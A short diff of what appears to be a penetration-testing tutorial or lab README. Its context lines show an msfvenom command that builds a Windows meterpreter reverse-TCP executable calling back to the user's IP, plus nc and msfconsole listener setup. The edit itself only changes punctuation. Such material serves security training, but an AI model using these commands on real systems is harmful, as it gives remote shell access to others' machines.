@@ -9,7 +9,7 @@
 Using meterpreter here, but feel free to play around with it. <br>
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=[YOUR_IP] LPORT=4444 -a x86 -f exe -o [FILE_NAME.exe]
 
-4. Setup your listener with nc or msfconsole. <br>
+4. Setup your listener with nc or msfconsole: <br>
 nc -lvnp 9001 <br>
 or <br>
 msfconsole -q <br>
